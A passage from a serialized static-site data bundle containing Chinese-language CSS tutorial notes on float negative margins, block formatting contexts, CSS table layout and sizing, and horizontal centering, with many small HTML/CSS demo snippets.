</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n浮动元素反向设置外边距，因为是在后面增加或者减少布局尺寸的，所以并不会影响到当前浮动元素的展示效果的位置，但是会对后面紧挨着它的浮动元素（如果有的话）有影响（后面元素会位移）。可以看下面这个对比例子。\n\n<html>\n<head>\n  <style>\n  .outer { width: 100px; height: 100px; padding: 25px; border: 1px solid red; }\n  .inner { width: 50px; height: 50px; box-sizing: border-box; }\n  .col1 { float: left; background-color: red; }\n  .col2 { float: left; background-color: blue; }\n  .col3 { float: right; margin-right: -50px; border: 3px solid green; } /*同向设置外边距，有位移，在outer边界的右边显示*/\n  /*.col3 { float: right; margin-left: -50px; border: 3px solid green; }*/ /*反向设置外边距，无位移，在outer边界的左边显示*/\n  /*.col3 { float: left; margin-left: -50px; border: 3px solid green; }*/ /*正向设置外边距，有位移，在outer边界的左边显示*/\n  /*.col3 { float: left; margin-right: -50px; border: 3px solid green; }*/ /*反向设置外边距，无位移，在outer边界的右边显示*/\n  </style>\n</head>\n<body>\n  <div class="outer">\n      <div class="inner col1"></div>\n      <div class="inner col2"></div>\n      <div class="inner col3"></div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n弄懂上面所有规则和例子，在后面三列布局中你会明白类似于margin-right:-100%的作用了，至于100%就很简单了，是父级元素的contentarea宽度的百分比，不包含父级元素的内边距宽度哦！还有，在三列布局中不一定要使用margin-right:-100%，原因是父级的contentarea宽度比左右两列小时，margin-right:-100%就无法让左右两列上跳了。\n\n\n# 四、bfc\n\n\n# 4.1 什么是bfc\n\n格式化上下文（formatting context）是页面中的一个渲染区域，并且有自己的一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。\n\n那么块级格式上下文（block formatting context，bfc）就很好理解了，是一个块级的渲染区域，这个块级“容器”内部布局是独立的，并且也不会影响到外部元素（与外界隔离了）。\n\n\n# 4.2 怎么触发bfc\n\n下列方式会触发bfc：\n\n * 根元素：<html>；\n * 溢出：除了overflow: visible；\n * 浮动元素：除了float: none；\n * 绝对定位元素：position为absolute | fixed；\n * 行内块元素、弹性元素、网格元素：display为inline-block | flex | grid，弹性元素还包括display: inline-flex元素的直接子元素，网格元素还包括display: inline-grid元素的直接子元素；\n * 表格相关：display为table | inline-table | table-row | table-row-group | table-header-group | table-footer-group | table-cell | table-caption；\n * 多列相关：column-count 或 column-width 不为auto，column-span 为all的元素始终会创建一个新的bfc，即使该元素没有包裹在一个多列容器中（标准变更，chrome bug）；\n * 渲染相关：contain为layout |content | paint的元素；\n * 其他：display: flow-root可以创建无副作用的 bfc。\n\n\n# 4.3 bfc的作用\n\n可以规避块级盒子的上下外边距折叠问题，相当于两个容器挨着，但容器内部与容器壁之间有间距，两个间距加起来就是两个不同容器内部元素之间的距离。\n\n<html>\n<head>\n    <style type="text/css">\n    /*display: flow-root会创建无副作用的bfc*/\n    .container { display: flow-root; }\n    p {\n        width: 100px;\n        height: 100px;\n        background: lightblue;\n        margin: 20px;\n    }\n    </style>\n</head>\n<body>\n  \x3c!--可以去掉两个div，看看p的之间的间距是否折叠--\x3e\n  <div class="container">\n      <p></p>\n  </div>\n  <div class="container">\n      <p></p>\n  </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n可以包裹住浮动元素，因为计算bfc的高度时，浮动元素也参与计算。效果上看是“清除浮动”，让浮动元素当作类似于内联块级盒子一样。\n\n<html>\n<head>\n    <style type="text/css">\n    /*创建无副作用的bfc，可以去掉“display: flow-root”看一下outer这个div是否能包裹住浮动元素*/\n    .outer { display: flow-root; border: 1px solid #000; }\n    .inner {\n        float: left;\n        width: 100px;\n        height: 100px;\n        background: #eee;\n    }\n    </style>\n</head>\n<body>\n<div class="outer">\n    <div class="inner"></div>\n</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n可以避免被浮动元素覆盖，因为bfc的区域不会与float box重叠。在浮动那节说过，浮动后面的元素会占据浮动之前的位置，那么浮动元素是很可能遮住后面的元素，但是后面元素的文本图片等内容会围绕着浮动元素来展示。那么bfc是让后面的元素也避开浮动元素，不被遮挡。\n\n<html>\n<head>\n    <style type="text/css">\n        .left { float: left; width: 100px; height: 100px; background-color: red; }\n        /*display: flow-root会创建无副作用的bfc*/\n        .right { display: flow-root; width: 300px; height: 200px; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right">实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本实例文本</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',charsets:{cjk:!0}},{title:"6.表格与居中布局",frontmatter:{title:"6.表格与居中布局"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/6.%E8%A1%A8%E6%A0%BC%E4%B8%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html",relativePath:"book-web/html、css、js、ts/学习CSS/6.表格与居中布局.md",key:"v-493e907e",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/6.%E8%A1%A8%E6%A0%BC%E4%B8%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html",headers:[{level:2,title:"一、表格布局",slug:"一、表格布局",normalizedTitle:"一、表格布局",charIndex:16},{level:3,title:"1.1 与表相关的display值",slug:"_1-1-与表相关的display值",normalizedTitle:"1.1 与表相关的display值",charIndex:241},{level:3,title:"1.2 匿名补全表格",slug:"_1-2-匿名补全表格",normalizedTitle:"1.2 匿名补全表格",charIndex:1198},{level:3,title:"1.3 了解表分层",slug:"_1-3-了解表分层",normalizedTitle:"1.3 了解表分层",charIndex:5096},{level:3,title:"1.4 边界模型",slug:"_1-4-边界模型",normalizedTitle:"1.4 边界模型",charIndex:5191},{level:3,title:"1.5 表大小",slug:"_1-5-表大小",normalizedTitle:"1.5 表大小",charIndex:7586},{level:3,title:"1.6 单元格内的对齐",slug:"_1-6-单元格内的对齐",normalizedTitle:"1.6 单元格内的对齐",charIndex:12436},{level:2,title:"二、居中布局",slug:"二、居中布局",normalizedTitle:"二、居中布局",charIndex:12874},{level:3,title:"2.1 水平居中",slug:"_2-1-水平居中",normalizedTitle:"2.1 水平居中",charIndex:12885},{level:3,title:"2.2 垂直居中",slug:"_2-2-垂直居中",normalizedTitle:"2.2 垂直居中",charIndex:18166},{level:3,title:"2.3 水平+垂直居中",slug:"_2-3-水平-垂直居中",normalizedTitle:"2.3 水平+垂直居中",charIndex:21597}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、表格布局 1.1 与表相关的display值 1.2 匿名补全表格 1.3 了解表分层 1.4 边界模型 1.5 表大小 1.6 单元格内的对齐 二、居中布局 2.1 水平居中 2.2 垂直居中 2.3 水平+垂直居中",content:'# 表格布局与居中布局\n\n\n# 一、表格布局\n\n很久以前是使用html<table>标签给页面元素进行布局的，但由于不灵活、难以调试等缺点被其他布局方案所取代了。现在基本很少会用到表格布局，也只是用于兼容一些不支持Flexbox和Grid的浏览器，或者在一些小模块里使用它。\n\n一个<table>标签之所以能够像表格那样展示，是由于css默认给<table>标签设置了一组table布局属性。当这些属性被应用于排列非<table>元素时，这种用法被称为“使用CSS表格”。\n\n\n# 1.1 与表相关的display值\n\n值                    意义\ntable                指定元素为块级表\ninline-table         指定元素为内联表\ntable-row            指定元素为表的某行\ntable-row-group      指定元素对一行或多行为表的行分组\ntable-header-group   指定元素为标题行（表头），位于所有行和行分组之前\ntable-footer-group   指定元素为页脚行，位于所有行和行分组之后\ntable-column         指定元素为表的某列，但不会被可视化呈现\ntable-column-group   指定元素对一列或多列为表的列分组，但不会被可视化呈现\ntable-cell           指定元素为表的单元格\ntable-caption        指定元素为表的标题，只有一个\n\n给下面加上css的表相关的display值\n\n<scores>\n  <headers>\n    <label>Team</label>\n    <label>Score</label>\n  </headers>\n  <game sport="MLB" league="NL">\n    <team>\n      <name>Reds</name>\n      <score>8</score>\n    </team>\n    <team>\n      <name>Cubs</name>\n      <score>5</score>\n    </team>\n  </game>\n</scores>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nscores { display: table; }\nheaders { display: table-header-group; }\ngame { display: table-row-group; }\nteam { display: table-row; }\nlabel,\nname,\nscore { display: table-cell; }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 1.2 匿名补全表格\n\n在使用表布局时，元素的结构可能不是完整的表形式的，那么css会为表插入缺少的部件（匿名对象的方式）。\n\n 1. 如果table-cell元素的父元素不是table-row元素，则在table-cell元素与其父元素之间插入一个匿名table-row对象。插入的对象将包括table-cell元素的所有连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\x3c!--会在system内匿名插入一个table-row，新行会包含name和moons--\x3e\n            <name>Mercury</name>\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. 如果table-row元素的父元素不是table、inline-table或table-row-group元素，则在table-row元素与其父元素之间插入一个匿名table元素。插入的对象将包括table-row元素的所有连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        docbody { display: block; }\n        planet { display: table-row; }\n        </style>\n    </head>\n    <body>\n        <docbody>\x3c!--docbody和planet之间匿名插入一个table--\x3e\n            <planet>\n                <name>Mercury</name>\n                <moons>0</moons>\n            </planet>\n            <planet>\n                <name>Venus</name>\n                <moons>0</moons>\n            </planet>\n        </docbody>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 3. 如果table-column元素的父元素不是table、inline-table或table-column-group元素，则在table-column元素与其父元素之间插入一个匿名table元素。例子与上面类似。\n\n 4. 如果table-row-group、table-header-group、table-footer-group、table-column-group或table-caption元素的父元素不是table元素，则在元素与其父元素之间插入一个匿名table对象。例子与上面类似。\n\n 5. 如果table或inline-table元素的子元素不是table-row-group、table-header-group、table-footer-group、table-row或table-caption元素，则在table元素及其子元素之间插入一个匿名table-row对象。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>Mercury</name>\n                <moons>0</moons>\n            </planet>\n            <name>Venus</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 6. 如果table-row-group、table-header-group或table-footer-group元素的子元素不是table-row元素，则在元素及其子元素之间插入一个匿名table-row对象。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row-group; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>Mercury</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n                <moons>0</moons>\n            </planet>\n            <name>Venus</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 7. 如果table-row元素的子元素不是table-cell元素，则在元素及其子元素之间插入一个匿名table-cell对象。这个匿名对象包含了所有非table-cell元素的子元素的连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>Mercury</name>\n                <num>0</num>\x3c!--num没有display值，外面匿名插入一个table-cell--\x3e\n            </planet>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n\n# 1.3 了解表分层\n\ncss给表定义了六个单独的“层”：表——列组——列——行组——行——单元格\n\n\n要了解这个分层，上一层的样式会覆盖下一层的样式，这在对表进行样式书写时很重要。\n\n\n# 1.4 边界模型\n\n边界模型主要是用于描述单元格的边界border，有两种：分离边界模型和折叠边界模型。可以使用border-collapse属性来选择表的边界模型，其值一般是collapse或separate。\n\n# 1.4.1 分离边界模型\n\n分离边界模型：表本身以及表的单元格都有各自的边界border，表与单元格之间还有内边距，并且单元格与单元格之间也有间距。\n\n\n\n单元格与单元格之间的间距是由border-spacing控制的，要注意的一点是，表内边距与这个间距是相加的（并不是折叠）。如果单元格内容为空，默认也会为它绘制border的（默认是empty-cells:show），如果设置empty-cells:hide那将不会为空的单元格绘制border。\n\n<html>\n<head>\n    <style type="text/css">\n    table {\n        border-collapse: separate;  /*分离边界模型*/\n        border: 1px solid black;\n        padding: 5px;              /*表与单元格之间的间距，其实就是表的内边距*/\n        border-spacing: 5px 8px;    /*单元格与单元格之间，水平间距5px，垂直间距8px*/\n    }\n    td {\n        border: 3px double black;   /*单元格里有各自的border，这里都是双实线*/\n        padding: 3px;\n        empty-cells: hide;          /*单元格为空，此时根据empty-cells的值，不会为空单元格绘制border*/\n    }\n    </style>\n</head>\n<body>\n    <table cellspacing="0">\n        <tr>\n            <td>cell one</td>\n            <td>cell two</td>\n        </tr>\n        <tr>\n            <td>cell three</td>\n            <td></td>\n        </tr>\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# 1.4.2 折叠边界模型\n\n折叠边界模型：表本身以及表的单元格，它们的边界都是折叠在一起的，表与单元格之间没有内边距（因为表与单元格边界折叠了），并且单元格与单元格之间也没有间距（因为单元格与单元格边界也折叠了）。\n\n\n\n它们所有的边界都已经折叠在一起了，所以border-spacing的设置会被忽略，表的内边距也被忽略掉。empty-cells:hide其实也会被忽略，会强制给空单元格绘制border。将上面例子里的border-collapse: separate改为border-collapse: collapse就可以查看折叠边界模型的效果。\n\n<html>\n<head>\n    <style type="text/css">\n    table {\n        border-collapse: collapse;  /*折叠边界模型*/\n        border: 1px solid black;\n        padding: 5px;              /*表内边距失效*/\n        border-spacing: 5px 8px;    /*单元格之间的间距失效*/\n    }\n    td {\n        border: 3px double black;   /*单元格共享border，这里都是双实线*/\n        padding: 3px;               /*内容与单元格之间的内边距还是有效的*/\n        empty-cells: hide;          /*失效*/\n    }\n    </style>\n</head>\n<body>\n    <table cellspacing="0">\n        <tr>\n            <td>cell one</td>\n            <td>cell two</td>\n        </tr>\n        <tr>\n            <td>cell three</td>\n            <td>cell four</td>\n        </tr>\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n比较有趣的一点就是边界折叠后，表分层对边界没有太大的影响，它有自己的一套优先级顺序来决定边界的样式：\n\n * border-style为hidden的边界会优先于其他规则；\n * 宽的边界优先于窄的边界，也就是width值大的优先；\n * 边界线条类型按照这个顺序优先：double、solid、dashed、dotted、ridge、outset、groove、inset、none；\n * 如果线条类型和width都相同，但颜色不同，那颜色就由表分层的顺序来决定了。\n\n\n# 1.5 表大小\n\n# 1.5.1 基本计算\n\n上一节的两种边界模式会导致表的宽高计算不一样。\n\n\n\n分离边界模型的宽：\n\n * 假设表边界是4px，表内边距是3px，水平间距是6px，单元格边界是2px，单元格内容加上内边距是20px；\n * 那么表总宽就是tbody的宽加上表左右边界再加上表左右内边距，即table = 4px + 3px + tbody + 3px + 4px；\n * 而tbody的宽是所有列加上所有水平间距，默认所有单元格相同，即tbody = 6px * 3 + col * 2；\n * col的宽是内容加上内边距再加上单元格左右边界，即col = 2px + 20px + 2px；\n * 最后表总宽为table = 4px + 3px + (6px * 3 + (2px + 20px + 2px) * 2) + 3px + 4px，总共80px。\n\n\n\n折叠边界模型的宽：\n\n * 没有表内边距，也没有水平垂直间距；假设表边界和单元格边界都是1px，单元格内容加上内边距是20px；\n * 那么表总宽就是tbody的宽加上表左右边界的一半，即table = 0.5px + tbody + 0.5px；\n * 而tbody的宽是所有列的宽之和，默认所有单元格相同，即tbody = col * 3；\n * col的宽是内容加上内边距再加上单元格左右边界的一半，即col = 0.5px + 20px + 0.5px；\n * 最后表总宽为table = 0.5px + (0.5px + 20px + 0.5px) * 3 + 0.5px，总共64px。\n\n# 1.5.2 固定和自动\n\n以上是最基础的宽度高度计算，但是表宽高在具体计算时有不同的表现，其中表宽有固定宽度布局和自动宽度布局两种表现方式，而表高就只有自动高度布局。可以使用table-layout属性来为表选择布局模式，其值为auto | fixed。\n\n两种表现方式的区别：固定宽度布局主要是以第一行为基准，而自动宽度布局要“征询”所有行的“意见”。\n\n固定宽度布局：\n\n * 如果列设置了width值，那么这一列的宽度就是该width值。\n * 如果列设置了auto值，但是该列第一行单元格设置了width值，那么这一列的宽度就是第一行单元格的width值。\n * 如果列设置了auto值，但是该列第一行单元格设置了width值，并且这个单元格跨列了，那么会被划分到各自的列里。\n * 算出了总列宽，但是表也单独设置了宽度并且还比总列宽的值大，多出部分会分配给列（也是第一行为基准）。如果有几列没有设置width值，多出部分会平分给这几列；如果所有列都有固定的width值，那就将多出的部分平分给所有列。\n * 如果表设置的宽度小于算出的总列宽，那会忽略设置的表宽，而总列宽会作为最终的表宽。\n\n<html>\n<head>\n    <style>\n    table {\n        table-layout: fixed;                /*固定宽度布局*/\n        width: 400px;                       /*表总宽*/\n        border-collapse: collapse;          /*表是折叠边界模型*/\n    }\n    td { padding: 0; border: 1px solid; }   /*单元格内边距为0，边界为1包括表边界*/\n    col#c1 { width: 200px; }                /*第一列的宽为200px*/\n    #r1c2 { width: 76px; }                  /*第二列第一行的单元格内容宽为76px*/\n    #r2c3 { width: 500px; }                 /*不在第一行会被忽略*/\n    </style>\n</head>\n<body>\n    <table>\n        <colgroup>\n            <col id="c1" /><col id="c2" /><col id="c3" /><col id="c4" />\n        </colgroup>\n        \x3c!-- 最后两列没有width，那就会被分配，(400 - 0.5 * 2 - 200 - 0.5 * 2 - 76) / 2 = 61px --\x3e\n        \x3c!-- 在浏览器调试代码时，将鼠标悬浮至最后两列显示宽度就是61px，内容自然是61 - 0.5 * 2 = 60px --\x3e\n        <tr>\n            <td id="r1c1">1-1</td><td id="r1c2">1-2</td><td id="r1c3">1-3</td><td id="r1c4">1-4</td>\n        </tr>\n        <tr>\n            <td id="r2c1">2-1</td><td id="r2c2">2-2</td><td id="r2c3">2-3</td><td id="r2c4">2-4</td>\n        </tr>\n        <tr>\n            <td id="r3c1">3-1</td><td id="r3c2">3-2</td><td id="r3c3">3-3</td><td id="r3c4">3-4</td>\n        </tr>\n        <tr>\n            <td id="r4c1">4-1</td><td id="r4c2">4-2</td><td id="r4c3">4-3</td><td id="r4c4">4-4</td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n自动宽度布局：\n\n * 对于列中的每个单元格，计算最小单元格宽度。\n   * 确定显示内容所需的最小宽度（内容可在单元格内换行显示）；\n   * 如果单元格设置了width值，并且大于内容所需的最小宽度，那么最小单元格宽度就是这个width值；\n   * 如果单元格设置的width值为auto，那么最小单元格宽度就是内容所需的最小宽度。\n * 对于列中的每个单元格，计算最大单元格宽度。\n   * 确定显示内容所需的最大宽度，除了强制换行（<br>）以外，不会自动进行换行，此时内容最大宽度就是最大单元格宽度。\n * 对于每个列，计算最小列宽。\n   * 如果列设置了width值，并且大于列中所有最小单元格宽度，那么最小列宽就是这个width值。\n   * 如果列没有设置width值，最小列宽就是列中所有最小单元格宽度里最大的那一个。\n * 对于每个列，计算最大列宽。\n   * 如果列设置了width值，并且大于列中所有最大单元格宽度，那么最大列宽就是这个width值。\n   * 如果列没有设置width值，最大列宽就是列中所有最大单元格宽度里最大的那一个。\n * 对于跨多个列的单元格\n   * 最小列宽的和必须等于该单元格的最小单元格宽度；\n   * 最大列宽的和必须等于该单元格的最大单元格宽度。\n * 算出了总列宽（使用最大列宽来展示），但是表也单独设置了宽度并且还比总列宽的值大，多出部分会分配给列（也是第一行为基准）。如果有几列没有设置width值，多出部分会平分给这几列；如果所有列都有固定的width值，那就将多出的部分平分给所有列。\n * 如果表设置的宽度小于算出的总列宽，那会忽略设置的表宽，而总列宽会作为最终的表宽。\n\n<html>\n<head>\n    <style>\n    table {\n        table-layout: auto;\n        width: auto;\n        border-collapse: collapse;\n    }\n    td { border: 1px solid; padding: 0; }\n    col#c3 { width: 25%; }\n    #r1c2 { width: 40%; }\n    #r2c2 { width: 50px; }\n    #r2c3 { width: 35px; }\n    #r4c1 { width: 100px; }\n    #r4c4 { width: 1px; }\n    </style>\n</head>\n<body>\n    <table>\n        <colgroup>\n            <col id="c1" /><col id="c2" /><col id="c3" /><col id="c4" />\n        </colgroup>\n        <tr>\n            <td id="r1c1">1-1</td><td id="r1c2">1-2</td><td id="r1c3">1-3</td><td id="r1c4">1-4</td>\n        </tr>\n        <tr>\n            <td id="r2c1">2-1</td><td id="r2c2">2-2</td><td id="r2c3">2-3</td><td id="r2c4">2-4</td>\n        </tr>\n        <tr>\n            <td id="r3c1">3-1</td><td id="r3c2">3-2</td><td id="r3c3">3-3</td><td id="r3c4">3-4</td>\n        </tr>\n        <tr>\n            <td id="r4c1">4-1</td><td id="r4c2">4-2</td><td id="r4c3">4-3</td><td id="r4c4">4-4</td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n上面这个例子，第一列的最小和最大列宽都为100px，第二列的最小列宽是50px而最大列宽是40%，第三列的最小列宽是35px而最大列宽是25%，第四列的最小和最大列宽都是单元格最小内容宽度。根据第二、三列反推出的表宽大概在一百多，而根据第一、四列反推出的表宽要更大，那就是第一、四列反推是正确的思路。(100+24+4)/(1-25%-40%)=366px，其中24是估算的第四列内容宽度，4是剩余border总和。注意：因为百分比还有表格宽度展示使用整数等原因，计算出的总宽度还有列宽度会有误差。\n\n可能觉得自动宽度布局很复杂，那自动高度布局也会很复杂，其实高度取决于内容换行。如果表设置了高的值，它更像是min-height，也就说实际表高度可能比设置的高度要大。如果实际高度小于设置高度，那可能会扩展出新行也可能会留出空白。建议尽可能避免设置表高度。\n\n\n# 1.6 单元格内的对齐\n\n水平对齐方式：因为单元格被视为块级别的框（单独拿一个来看），那么使用text-align就可以完成单元格里内联内容的水平对齐了。text-align属性，其值left | right | center | justify，这个justify稍微注意一下是两端对齐，会调整单词和字母间的间隔，使各行的长度恰好相等。\n\n垂直对齐方式：直接使用vertical-align属性，经常使用的值top | bottom | middle | baseline，而sub | super | text-top | text-bottom这几个被应用在单元格时会被忽略（内部内联元素使用vertical-align时，还是所有值都有效）。还有这个baseline复杂一些，它是基线对齐，会让一行里的所有单元格内容按照初始单元格基线对齐，初始单元格基线一般是内容第一行的文本底线。\n\n参考：text-align水平对齐和vertical-align垂直对齐\n\n\n# 二、居中布局\n\n\n# 2.1 水平居中\n\n水平居中意思是让子元素在父容器内部水平方向上是居中显示的。\n\n# 2.1.1 使用text-align\n\n使用text-align: center是最简单的一种水平对齐方式，不过text-align属性是设置在具有块级特性的元素上的，然后对元素内部的内联内容进行水平居中对齐。可以回顾一下之前的文字水平对齐。那么子元素得是内联元素（文本也行）或者display: inline-block内联块级元素也可以。\n\n该方法的优点是，text-align的兼容性很好，如果搭配display: inline-block还能对多个子元素在一排上进行水平居中布局的。有个小缺点就是，text-align会影响到子元素文本内容对齐方式，需要在子元素上额外设置自己的text-align来屏蔽父容器的text-align。\n\n\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px;\n            border: 1px solid red;\n            /*让元素内部的并具有内联性质的子元素进行水平居中对齐*/\n            text-align: center;\n        }\n        .col1, .col2, .col3 {\n            /*内联块级元素*/\n            display: inline-block;\n            width: 100px;\n            height: 100px;\n            text-align: left;\n        }\n        .col1 { background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n如果熟悉浏览器兼容，text-align: -moz-center和text-align: -webkit-center是能对元素内部具有块性质的子元素进行水平居中对齐的。效果跟上面不一样，因为是块级元素，所以内容都单独占据一行，那么效果就是在一列上的元素都是水平居中对齐的。\n\n\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px;\n            border: 1px solid red;\n            text-align: center;\n            /* 让元素内部的并具有块性质的子元素进行水平居中对齐 */\n            text-align: -webkit-center;\n        }\n        .col1, .col2, .col3 {\n            width: 100px;\n            height: 100px;\n            text-align: left;\n        }\n        .col1 { background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# 2.1.2 使用auto外边距\n\n如果一个块级元素显式设置了宽度，它的外边距设置为auto时，那么这个块级元素会水平居中（原因是块级元素的隐藏等式）。其实这种方法跟上面的text-align: -moz-center和text-align: -webkit-center的效果是类似的，只是我们这种方法没有兼容性问题。\n\n这种方法优点是，比较简单常用，缺点就是只能对一个元素进行水平居中布局，其他内容只能写到子元素内部了。相比于text-align: center+display: inline-block这种方法，会多套一层元素。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            width: 600px;\n            border: 1px solid red;\n        }\n        .parent {\n            width: 310px;\n            /* 让parent居中 */\n            margin: 0 auto;\n        }\n        /* 其他内容只能写到parent内部了 */\n        .col1, .col2, .col3 { display: inline-block; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n还可以将子元素替换为table，因为table也是具有块级性质的。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            width: 600px;\n            border: 1px solid red;\n        }\n        .parent {\n            /* 具有块级性质 */\n            display: table;\n            width: 300px;\n            /* 让parent也就是表格居中 */\n            margin: 0 auto;\n        }\n        /* 其他内容只能写到parent内部了，其他内容其实就是单元格了 */\n        .col1, .col2, .col3 { display: table-cell; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 2.1.3 绝对定位+位移变换\n\n该方法的核心就是使用绝对定位将子元素的位置居中，但不是子元素中心点居中了，那就需要使用transform: translateX(-50%);进行调整。\n\n该方法优点是，还算比较简单，缺点就是开启了相对定位以及绝对定位，绝对定位脱离了文档流，也只能对一个元素进行水平居中布局。相比于text-align: center+display: inline-block这种方法，会多套一层元素。其实你要是知道各自的宽度和间隔，也不是不能减少一层元素，只是计算比较麻烦没有灵活性。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 600px;\n            height: 100px;\n            border: 1px solid red;\n        }\n        .parent {\n            